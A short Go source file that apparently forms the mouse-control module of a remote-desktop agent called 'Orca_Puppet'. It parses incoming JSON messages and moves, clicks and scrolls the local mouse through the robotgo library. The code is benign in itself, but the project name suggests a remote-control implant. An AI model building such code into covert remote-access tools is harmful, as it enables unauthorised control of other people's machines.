package rdesktopopt

import (
	"Orca_Puppet/cli/common"
	"encoding/json"
	"github.com/go-vgo/robotgo"
)

type Pos struct {
	X int
	Y int
}

// 鼠标滚动
type Scroll struct {
	ScrollX int
	ScrollY int
}

type MouseInfo struct {
	MousePos    Pos
	PressButton string
	Scroll      Scroll
	Toggle      bool
}

// 获取鼠标信息
func GetMouseInfo(message string) MouseInfo {
	var mouseInfo MouseInfo
	_, _, data := common.SettleRetDataBt(message)
	json.Unmarshal(data, &mouseInfo)
	return mouseInfo
}

// 处理鼠标动作
func SettleMouseAction(mouseInfo MouseInfo) {
	if mouseInfo.PressButton != "" {
		if mouseInfo.Toggle {
			robotgo.Toggle()
		}
		MoveMouseToPos(mouseInfo)
		ClickMouse(mouseInfo)
	}
	if mouseInfo.Scroll.ScrollX != 0 || mouseInfo.Scroll.ScrollY != 0 {
		scrollX := int(float64(mouseInfo.Scroll.ScrollX) / robotgo.ScaleF())
		scrollY := int(float64(mouseInfo.Scroll.ScrollY) / robotgo.ScaleF())
		MoveMouseToPos(mouseInfo)
		robotgo.Scroll(scrollX, scrollY)
	}
}

// 移动鼠标
func MoveMouseToPos(mouseInfo MouseInfo) {
	moveX := int(float64(mouseInfo.MousePos.X) / robotgo.ScaleF())
	moveY := int(float64(mouseInfo.MousePos.Y) / robotgo.ScaleF())
	if moveX < 0 || moveY < 0 {
		return
	}
	robotgo.Move(moveX, moveY)
	robotgo.MilliSleep(10)
}

// 点击鼠标
func ClickMouse(mouseInfo MouseInfo) {
	btn := mouseInfo.PressButton
	robotgo.Click(btn)
}
